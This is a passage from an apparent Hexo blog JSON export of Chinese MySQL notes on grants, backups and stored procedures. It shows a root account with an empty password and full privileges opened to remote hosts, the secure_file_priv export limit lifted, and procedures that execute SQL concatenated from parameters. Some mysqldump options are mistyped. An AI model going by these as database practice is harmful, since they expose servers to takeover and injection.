查看现有用户,密码及允许连接的主机\n\n+------+----------+-----------+\n| User | Password | Host      |\n+------+----------+-----------+\n| root |          | localhost |\n+------+----------+-----------+\n1 row in set (0.00 sec)\n\n \n\nmysql> -- 只有一个默认的 root 用户, 密码为空, 只允许 localhost 连接\n12\nmysql> -- 下面我们另外添加一个新的 root 用户, 密码为空, 只允许 192.168.1.100 连接\n\nmysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.1.100' IDENTIFIED BY '' WITH GRANT OPTION;\n\n \n\nmysql> -- @'192.168.1.100'可以替换为@‘%’就可任意ip访问，当然我们也可以直接用 UPDATE 更新 root 用户 Host, 但不推荐, SQL如下:\n\nmysql> -- UPDATE user SET Host='192.168.1.100' WHERE User='root' AND Host='localhost' LIMIT 1;\n\nmysql> flush privileges;\n\nQuery OK, 0 rows affected (0.00 sec)\n```\n[更多](http://www.cnblogs.com/jyginger/archive/2011/04/27/2030017.html)","source":"_posts/数据库/mysql/MySQL.md","raw":"---\ntitle: MySQL\ndate: 2018-07-10 21:09:19\ntags: mysql\n---\n- #### 修改用户名密码：\n```\nUPDATE user SET password=PASSWORD('123456') WHERE user='root';\nFLUSH PRIVILEGES;\n```\n- #### 查勘表结构\n```\nshow Create table 【tablename】\n```\n- #### update\n```\nUPDATE [LOW_PRIORITY] [IGNORE] tbl_name  \nSET col_name1=expr1 [, col_name2=expr2 ...]  \n[WHERE where_definition]  \n[ORDER BY ...]  \n[LIMIT row_count] \n```\n- #### 用户权限和远程连接\n```\nmysql> USE mysql; -- 切换到 mysql DB\n\nDatabase changed\n\nmysql> SELECT User, Password, Host FROM user; -- 查看现有用户,密码及允许连接的主机\n\n+------+----------+-----------+\n| User | Password | Host      |\n+------+----------+-----------+\n| root |          | localhost |\n+------+----------+-----------+\n1 row in set (0.00 sec)\n\n \n\nmysql> -- 只有一个默认的 root 用户, 密码为空, 只允许 localhost 连接\n12\nmysql> -- 下面我们另外添加一个新的 root 用户, 密码为空, 只允许 192.168.1.100 连接\n\nmysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.1.100' IDENTIFIED BY '' WITH GRANT OPTION;\n\n \n\nmysql> -- @'192.168.1.100'可以替换为@‘%’就可任意ip访问，当然我们也可以直接用 UPDATE 更新 root 用户 Host, 但不推荐, SQL如下:\n\nmysql> -- UPDATE user SET Host='192.168.1.100' WHERE User='root' AND Host='localhost' LIMIT 1;\n\nmysql> flush privileges;\n\nQuery OK, 0 rows affected (0.00 sec)\n```\n[更多](http://www.cnblogs.com/jyginger/archive/2011/04/27/2030017.html)","slug":"数据库/mysql/MySQL","published":1,"updated":"2018-07-10T13:10:10.010Z","_id":"cjjedmhdb009o0gtjc35gg8ul","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"修改用户名密码：\"><a href=\"#修改用户名密码：\" class=\"headerlink\" title=\"修改用户名密码：\"></a>修改用户名密码：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE user SET password=PASSWORD(&apos;123456&apos;) WHERE user=&apos;root&apos;;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"查勘表结构\"><a href=\"#查勘表结构\" class=\"headerlink\" title=\"查勘表结构\"></a>查勘表结构</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show Create table 【tablename】</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"update\"><a href=\"#update\" class=\"headerlink\" title=\"update\"></a>update</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE [LOW_PRIORITY] [IGNORE] tbl_name  </span><br><span class=\"line\">SET col_name1=expr1 [, col_name2=expr2 ...]  </span><br><span class=\"line\">[WHERE where_definition]  </span><br><span class=\"line\">[ORDER BY ...]  </span><br><span class=\"line\">[LIMIT row_count]</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"用户权限和远程连接\"><a href=\"#用户权限和远程连接\" class=\"headerlink\" title=\"用户权限和远程连接\"></a>用户权限和远程连接</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; USE mysql; -- 切换到 mysql DB</span><br><span class=\"line\"></span><br><span class=\"line\">Database changed</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT User, Password, Host FROM user; -- 查看现有用户,密码及允许连接的主机</span><br><span class=\"line\"></span><br><span class=\"line\">+------+----------+-----------+</span><br><span class=\"line\">| User | Password | Host      |</span><br><span class=\"line\">+------+----------+-----------+</span><br><span class=\"line\">| root |          | localhost |</span><br><span class=\"line\">+------+----------+-----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; -- 只有一个默认的 root 用户, 密码为空, 只允许 localhost 连接</span><br><span class=\"line\">12</span><br><span class=\"line\">mysql&gt; -- 下面我们另外添加一个新的 root 用户, 密码为空, 只允许 192.168.1.100 连接</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;192.168.1.100&apos; IDENTIFIED BY &apos;&apos; WITH GRANT OPTION;</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; -- @&apos;192.168.1.100&apos;可以替换为@‘%’就可任意ip访问，当然我们也可以直接用 UPDATE 更新 root 用户 Host, 但不推荐, SQL如下:</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; -- UPDATE user SET Host=&apos;192.168.1.100&apos; WHERE User=&apos;root&apos; AND Host=&apos;localhost&apos; LIMIT 1;</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; flush privileges;</span><br><span class=\"line\"></span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><a href=\"http://www.cnblogs.com/jyginger/archive/2011/04/27/2030017.html\" target=\"_blank\" rel=\"noopener\">更多</a></p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"修改用户名密码：\"><a href=\"#修改用户名密码：\" class=\"headerlink\" title=\"修改用户名密码：\"></a>修改用户名密码：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE user SET password=PASSWORD(&apos;123456&apos;) WHERE user=&apos;root&apos;;</span><br><span class=\"line\">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"查勘表结构\"><a href=\"#查勘表结构\" class=\"headerlink\" title=\"查勘表结构\"></a>查勘表结构</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show Create table 【tablename】</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"update\"><a href=\"#update\" class=\"headerlink\" title=\"update\"></a>update</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UPDATE [LOW_PRIORITY] [IGNORE] tbl_name  </span><br><span class=\"line\">SET col_name1=expr1 [, col_name2=expr2 ...]  </span><br><span class=\"line\">[WHERE where_definition]  </span><br><span class=\"line\">[ORDER BY ...]  </span><br><span class=\"line\">[LIMIT row_count]</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"用户权限和远程连接\"><a href=\"#用户权限和远程连接\" class=\"headerlink\" title=\"用户权限和远程连接\"></a>用户权限和远程连接</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; USE mysql; -- 切换到 mysql DB</span><br><span class=\"line\"></span><br><span class=\"line\">Database changed</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT User, Password, Host FROM user; -- 查看现有用户,密码及允许连接的主机</span><br><span class=\"line\"></span><br><span class=\"line\">+------+----------+-----------+</span><br><span class=\"line\">| User | Password | Host      |</span><br><span class=\"line\">+------+----------+-----------+</span><br><span class=\"line\">| root |          | localhost |</span><br><span class=\"line\">+------+----------+-----------+</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; -- 只有一个默认的 root 用户, 密码为空, 只允许 localhost 连接</span><br><span class=\"line\">12</span><br><span class=\"line\">mysql&gt; -- 下面我们另外添加一个新的 root 用户, 密码为空, 只允许 192.168.1.100 连接</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;192.168.1.100&apos; IDENTIFIED BY &apos;&apos; WITH GRANT OPTION;</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; -- @&apos;192.168.1.100&apos;可以替换为@‘%’就可任意ip访问，当然我们也可以直接用 UPDATE 更新 root 用户 Host, 但不推荐, SQL如下:</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; -- UPDATE user SET Host=&apos;192.168.1.100&apos; WHERE User=&apos;root&apos; AND Host=&apos;localhost&apos; LIMIT 1;</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; flush privileges;</span><br><span class=\"line\"></span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p><a href=\"http://www.cnblogs.com/jyginger/archive/2011/04/27/2030017.html\" target=\"_blank\" rel=\"noopener\">更多</a></p>\n"},{"title":"mysql备份","date":"2018-07-10T13:09:19.000Z","_content":"#### 备份一个数据库\r\n\r\n　　mysqldump基本语法：\r\n\r\n    mysqldump -u username -p dbname table1 table2 ...-> BackupName.sql\r\n\r\n　　其中：\r\n\r\ndbname参数表示数据库的名称；\r\n\r\ntable1和table2参数表示需要备份的表的名称，为空则整个数据库备份；\r\n\r\nBackupName.sql参数表设计备份文件的名称，文件名前面可以加上一个绝对路径。通常将数据库被分成一个后缀名为sql的文件；\r\n\r\n#### 备份多个数据库\r\n\r\n　　语法：\r\n\r\n    mysqldump -u username -p --databases dbname2 dbname2 > Backup.sql\r\n　　加上了--databases选项，然后后面跟多个数据库\r\n\r\n    mysqldump -u root -p --databases test mysql > D:\\backup.sql\r\n#### 备份所有数据库\r\n\r\n　　mysqldump命令备份所有数据库的语法如下：\r\n\r\n    mysqldump -u username -p -all-databases > BackupName.sql\r\n　　示例：\r\n\r\n    mysqldump -u -root -p -all-databases > D:\\all.sql\r\n\r\n#### 备份表\r\n语句：\r\n\r\n    select * from students where Age > 30 into outfile ‘/tmp/stud.txt' ;   //将年龄大于三十的同学的信息备份出来 \r\n\r\n备份的目录路径必须让当前运行mysql服务器的用户mysql具有访问权限\r\n\r\n可能会报错\r\n\r\n    mysqldump: Got error: 1290以及secure-file-priv option\r\n\r\nsecure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。\r\n\r\n当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出\r\n\r\n当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下\r\n\r\n当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制\r\n\r\n查看系统值\r\n\r\n    show global variables like '%secure%'; \r\n\r\n修改系统值\r\n\r\nmysql.cnf中的[mysqld]加入secure_file_priv = ","source":"_posts/数据库/mysql/mysql备份.md","raw":"---\ntitle: mysql备份\ndate: 2018-07-10 21:09:19\ntags: mysql\n---\n#### 备份一个数据库\r\n\r\n　　mysqldump基本语法：\r\n\r\n    mysqldump -u username -p dbname table1 table2 ...-> BackupName.sql\r\n\r\n　　其中：\r\n\r\ndbname参数表示数据库的名称；\r\n\r\ntable1和table2参数表示需要备份的表的名称，为空则整个数据库备份；\r\n\r\nBackupName.sql参数表设计备份文件的名称，文件名前面可以加上一个绝对路径。通常将数据库被分成一个后缀名为sql的文件；\r\n\r\n#### 备份多个数据库\r\n\r\n　　语法：\r\n\r\n    mysqldump -u username -p --databases dbname2 dbname2 > Backup.sql\r\n　　加上了--databases选项，然后后面跟多个数据库\r\n\r\n    mysqldump -u root -p --databases test mysql > D:\\backup.sql\r\n#### 备份所有数据库\r\n\r\n　　mysqldump命令备份所有数据库的语法如下：\r\n\r\n    mysqldump -u username -p -all-databases > BackupName.sql\r\n　　示例：\r\n\r\n    mysqldump -u -root -p -all-databases > D:\\all.sql\r\n\r\n#### 备份表\r\n语句：\r\n\r\n    select * from students where Age > 30 into outfile ‘/tmp/stud.txt' ;   //将年龄大于三十的同学的信息备份出来 \r\n\r\n备份的目录路径必须让当前运行mysql服务器的用户mysql具有访问权限\r\n\r\n可能会报错\r\n\r\n    mysqldump: Got error: 1290以及secure-file-priv option\r\n\r\nsecure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。\r\n\r\n当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出\r\n\r\n当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下\r\n\r\n当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制\r\n\r\n查看系统值\r\n\r\n    show global variables like '%secure%'; \r\n\r\n修改系统值\r\n\r\nmysql.cnf中的[mysqld]加入secure_file_priv = ","slug":"数据库/mysql/mysql备份","published":1,"updated":"2018-07-10T13:10:10.011Z","_id":"cjjedmhdc009p0gtjjbvaz99b","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"备份一个数据库\"><a href=\"#备份一个数据库\" class=\"headerlink\" title=\"备份一个数据库\"></a>备份一个数据库</h4><p>　　mysqldump基本语法：</p>\n<pre><code>mysqldump -u username -p dbname table1 table2 ...-&gt; BackupName.sql\n</code></pre><p>　　其中：</p>\n<p>dbname参数表示数据库的名称；</p>\n<p>table1和table2参数表示需要备份的表的名称，为空则整个数据库备份；</p>\n<p>BackupName.sql参数表设计备份文件的名称，文件名前面可以加上一个绝对路径。通常将数据库被分成一个后缀名为sql的文件；</p>\n<h4 id=\"备份多个数据库\"><a href=\"#备份多个数据库\" class=\"headerlink\" title=\"备份多个数据库\"></a>备份多个数据库</h4><p>　　语法：</p>\n<pre><code>mysqldump -u username -p --databases dbname2 dbname2 &gt; Backup.sql\n</code></pre><p>　　加上了–databases选项，然后后面跟多个数据库</p>\n<pre><code>mysqldump -u root -p --databases test mysql &gt; D:\\backup.sql\n</code></pre><h4 id=\"备份所有数据库\"><a href=\"#备份所有数据库\" class=\"headerlink\" title=\"备份所有数据库\"></a>备份所有数据库</h4><p>　　mysqldump命令备份所有数据库的语法如下：</p>\n<pre><code>mysqldump -u username -p -all-databases &gt; BackupName.sql\n</code></pre><p>　　示例：</p>\n<pre><code>mysqldump -u -root -p -all-databases &gt; D:\\all.sql\n</code></pre><h4 id=\"备份表\"><a href=\"#备份表\" class=\"headerlink\" title=\"备份表\"></a>备份表</h4><p>语句：</p>\n<pre><code>select * from students where Age &gt; 30 into outfile ‘/tmp/stud.txt&apos; ;   //将年龄大于三十的同学的信息备份出来 \n</code></pre><p>备份的目录路径必须让当前运行mysql服务器的用户mysql具有访问权限</p>\n<p>可能会报错</p>\n<pre><code>mysqldump: Got error: 1290以及secure-file-priv option\n</code></pre><p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>\n<p>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p>\n<p>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</p>\n<p>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>\n<p>查看系统值</p>\n<pre><code>show global variables like &apos;%secure%&apos;; \n</code></pre><p>修改系统值</p>\n<p>mysql.cnf中的[mysqld]加入secure_file_priv = </p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"备份一个数据库\"><a href=\"#备份一个数据库\" class=\"headerlink\" title=\"备份一个数据库\"></a>备份一个数据库</h4><p>　　mysqldump基本语法：</p>\n<pre><code>mysqldump -u username -p dbname table1 table2 ...-&gt; BackupName.sql\n</code></pre><p>　　其中：</p>\n<p>dbname参数表示数据库的名称；</p>\n<p>table1和table2参数表示需要备份的表的名称，为空则整个数据库备份；</p>\n<p>BackupName.sql参数表设计备份文件的名称，文件名前面可以加上一个绝对路径。通常将数据库被分成一个后缀名为sql的文件；</p>\n<h4 id=\"备份多个数据库\"><a href=\"#备份多个数据库\" class=\"headerlink\" title=\"备份多个数据库\"></a>备份多个数据库</h4><p>　　语法：</p>\n<pre><code>mysqldump -u username -p --databases dbname2 dbname2 &gt; Backup.sql\n</code></pre><p>　　加上了–databases选项，然后后面跟多个数据库</p>\n<pre><code>mysqldump -u root -p --databases test mysql &gt; D:\\backup.sql\n</code></pre><h4 id=\"备份所有数据库\"><a href=\"#备份所有数据库\" class=\"headerlink\" title=\"备份所有数据库\"></a>备份所有数据库</h4><p>　　mysqldump命令备份所有数据库的语法如下：</p>\n<pre><code>mysqldump -u username -p -all-databases &gt; BackupName.sql\n</code></pre><p>　　示例：</p>\n<pre><code>mysqldump -u -root -p -all-databases &gt; D:\\all.sql\n</code></pre><h4 id=\"备份表\"><a href=\"#备份表\" class=\"headerlink\" title=\"备份表\"></a>备份表</h4><p>语句：</p>\n<pre><code>select * from students where Age &gt; 30 into outfile ‘/tmp/stud.txt&apos; ;   //将年龄大于三十的同学的信息备份出来 \n</code></pre><p>备份的目录路径必须让当前运行mysql服务器的用户mysql具有访问权限</p>\n<p>可能会报错</p>\n<pre><code>mysqldump: Got error: 1290以及secure-file-priv option\n</code></pre><p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>\n<p>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</p>\n<p>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</p>\n<p>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</p>\n<p>查看系统值</p>\n<pre><code>show global variables like &apos;%secure%&apos;; \n</code></pre><p>修改系统值</p>\n<p>mysql.cnf中的[mysqld]加入secure_file_priv = </p>\n"},{"title":"oracle AWR 快照","date":"2018-07-10T13:09:20.000Z","_content":"http://343766868.blog.163.com/blog/static/48314056201110124513396/\nhttp://blog.csdn.net/stevendbaguo/article/details/8596653","source":"_posts/数据库/oracle/oracle AWR 快照.md","raw":"---\ntitle: oracle AWR 快照\ndate: 2018-07-10 21:09:20\ntags: oracle\n---\nhttp://343766868.blog.163.com/blog/static/48314056201110124513396/\nhttp://blog.csdn.net/stevendbaguo/article/details/8596653","slug":"数据库/oracle/oracle AWR 快照","published":1,"updated":"2018-07-10T13:10:10.016Z","_id":"cjjedmhde009r0gtj9r86uulw","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://343766868.blog.163.com/blog/static/48314056201110124513396/\" target=\"_blank\" rel=\"noopener\">http://343766868.blog.163.com/blog/static/48314056201110124513396/</a><br><a href=\"http://blog.csdn.net/stevendbaguo/article/details/8596653\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/stevendbaguo/article/details/8596653</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://343766868.blog.163.com/blog/static/48314056201110124513396/\" target=\"_blank\" rel=\"noopener\">http://343766868.blog.163.com/blog/static/48314056201110124513396/</a><br><a href=\"http://blog.csdn.net/stevendbaguo/article/details/8596653\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/stevendbaguo/article/details/8596653</a></p>\n"},{"title":"mysql存储过程","date":"2018-07-10T13:09:19.000Z","_content":"- ### 直接修改\n```\nDROP PROCEDURE IF EXISTS modrow;\nCREATE PROCEDURE modrow()\n  BEGIN\n\n    #DECLARE mod_row_count INT;\n\n    SELECT count(COLUMN_NAME)\n    as mod_row_count\n    FROM information_schema.columns\n    WHERE table_name = 'bopbusitypeinfo'\n          AND column_name IN ('acpt_category_no','acpt_category_name','param_id','param_name','need_flag','organ_flag','data_type','int_config','str_config');\n\n    IF mod_row_count = 9\n    THEN\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_no VARCHAR(4);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_name VARCHAR(64);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_id DECIMAL(10);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_name VARCHAR(2000);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY need_flag CHAR(1);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY organ_flag CHAR(1);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY data_type CHAR(1);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY int_config DECIMAL(10);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY str_config VARCHAR(255);\n    END IF;\n\n  END;\nCALL modrow();\n```\n- ### 定义分隔符\n```\ndelimiter //\nDROP PROCEDURE IF EXISTS modrow;\nCREATE PROCEDURE modrow()\n  BEGIN\n  select 1+1 from dual;\n  END;\nCALL modrow();\n//\n\n```\n- ### 带参数的\n```\nDROP PROCEDURE IF EXISTS modrow;\nCREATE PROCEDURE modrow(IN dbname VARCHAR(255),IN tablename VARCHAR(255),IN cloumname VARCHAR(255),IN descripe VARCHAR(1000))\n  BEGIN\n    DECLARE mod_row_count INT;\n    SET @dbname = dbname;\n    SET @tablename = tablename;\n    SET @cloumname = cloumname;\n    SET @descripe = descripe;\n\n    SELECT count(COLUMN_NAME)\n    INTO mod_row_count\n    FROM information_schema.columns\n    WHERE table_name = @tablename\n          AND column_name = @cloumname;\n\n    IF mod_row_count = 1\n    THEN\n      SET @insertSql = @descripe;\n      PREPARE stmtinsert FROM @insertSql;\n      EXECUTE stmtinsert;\n      DEALLOCATE PREPARE stmtinsert;\n    END IF;\n  END;\nCALL modrow('hselite','accept','prof_flag','ALTER TABLE hselite.accept MODIFY prof_flag VARCHAR(4)');\n```\n- ### 动态sql\n```\nDROP PROCEDURE IF EXISTS hselite.pro_mod_tab_col;\nCREATE DEFINER=`root`@`%` PROCEDURE `pro_mod_tab_col`(IN ddname varchar(64),IN talname varchar(64),IN colname varchar(64),IN typename varchar(64),IN commt varchar(64),IN def_var varchar(64))\n  BEGIN\n    DECLARE num VARCHAR(100);\n    declare l_tab_name varchar(100); #表名\n    declare l_dd_name varchar(100);  #库名\n    declare l_col_name varchar(100); #字段名\n    declare l_type_name varchar(100); #字段类型\n    declare l_commt varchar(100);  #注释\n    declare l_def_var varchar(100);  #默认值\n    declare SQL_FOR_alter varchar(500);  ##动态sql\n\n    set @l_dd_name=ddname ;\n    set @l_tab_name=talname;\n    set @l_col_name=colname;\n    set @l_type_name=typename;\n    set @l_commt=commt;\n    set @l_def_var=def_var;\n\n    set @SQL_FOR_alter=CONCAT(\"ALTER TABLE \" ,@l_dd_name,'.',@l_tab_name, \" MODIFY \",@l_col_name,' ',@l_type_name ,\" DEFAULT '\" ,@l_def_var,\"' not null COMMENT '\", @l_commt,\" ';\");\n    #select  @SQL_FOR_alter;\n    select count(1) into num from information_schema.columns WHERE table_schema=@l_dd_name and table_name = @l_tab_name AND column_name =@l_col_name;\n    #select num;\n    IF (num=1) THEN\n      PREPARE stmt1 FROM @SQL_FOR_alter;\n      EXECUTE stmt1;\n      DEALLOCATE PREPARE stmt1 ;\n    end if;\n  END;\n\n```\n\n","source":"_posts/数据库/mysql/mysql存储过程.md","raw":"---\ntitle: mysql存储过程\ndate: 2018-07-10 21:09:19\ntags: mysql\n---\n- ### 直接修改\n```\nDROP PROCEDURE IF EXISTS modrow;\nCREATE PROCEDURE modrow()\n  BEGIN\n\n    #DECLARE mod_row_count INT;\n\n    SELECT count(COLUMN_NAME)\n    as mod_row_count\n    FROM information_schema.columns\n    WHERE table_name = 'bopbusitypeinfo'\n          AND column_name IN ('acpt_category_no','acpt_category_name','param_id','param_name','need_flag','organ_flag','data_type','int_config','str_config');\n\n    IF mod_row_count = 9\n    THEN\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_no VARCHAR(4);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY acpt_category_name VARCHAR(64);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_id DECIMAL(10);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY param_name VARCHAR(2000);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY need_flag CHAR(1);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY organ_flag CHAR(1);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY data_type CHAR(1);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY int_config DECIMAL(10);\n      ALTER TABLE hselite.bopbusitypeinfo MODIFY str_config VARCHAR(255);\n    END IF;\n\n  END;\nCALL modrow();\n```\n- ### 定义分隔符\n```\ndelimiter //\nDROP PROCEDURE IF EXISTS modrow;\nCREATE PROCEDURE modrow()\n  BEGIN\n  select 1+1 from dual;\n  END;\nCALL modrow();\n//\n\n```\n- ### 带参数的\n```\nDROP PROCEDURE IF EXISTS modrow;\nCREATE PROCEDURE modrow(IN dbname VARCHAR(255),IN tablename VARCHAR(255),IN cloumname VARCHAR(255),IN descripe VARCHAR(1000))\n  BEGIN\n    DECLARE mod_row_count INT;\n    SET @dbname = dbname;\n    SET @tablename = tablename;\n    SET @cloumname = cloumname;\n    SET @descripe = descripe;\n\n    SELECT count(COLUMN_NAME)\n    INTO mod_row_count\n    FROM information_schema.columns\n    WHERE table_name = @tablename\n          AND column_name = @cloumname;\n\n    IF mod_row_count = 1\n    THEN\n      SET @insertSql = @descripe;\n      PREPARE stmtinsert FROM @insertSql;\n      EXECUTE stmtinsert;\n      DEALLOCATE PREPARE stmtinsert;\n    END IF;\n  END;\nCALL modrow('hselite','accept','prof_flag','ALTER TABLE hselite.accept MODIFY prof_flag VARCHAR(4)');\n```\n- ### 动态sql\n```\nDROP PROCEDURE IF EXISTS hselite.pro_mod_tab_col;\nCREATE DEFINER=`root`@`%` PROCEDURE `pro_mod_tab_col`(IN ddname varchar(64),IN talname varchar(64),IN colname varchar(64),IN typename varchar(64),IN commt varchar(64),IN def_var varchar(64))\n  BEGIN\n    DECLARE num VARCHAR(100);\n    declare l_tab_name varchar(100); #表名\n    declare l_dd_name varchar(100);  #库名\n    declare l_col_name varchar(100); #字段名\n    declare l_type_name varchar(100); #字段类型\n    declare l_commt varchar(100);  #注释\n    declare l_def_var varchar(100);  #默认值\n    declare SQL_FOR_alter varchar(500);  ##动态sql\n\n    set @l_dd_name=ddname ;\n    set @l_tab_name=talname;\n    set @l_col_name=colname;\n    set @l_type_name=typename;\n    set @l_commt=commt;\n    set @l_def_var=def_var;\n\n    set @SQL_FOR_alter=CONCAT(\"ALTER TABLE \" ,@l_dd_name,'.',@l_tab_name, \" MODIFY \",@l_col_name,' ',@l_type_name ,\" DEFAULT '\" ,@l_def_var,\"' not null COMMENT '\", @l_commt,\" ';\");\n    #select  @SQL_FOR_alter;\n    select count(1) into num from information_schema.columns WHERE table_schema=@l_dd_name and table_name = @l_tab_name AND column_name =@l_col_name;\n    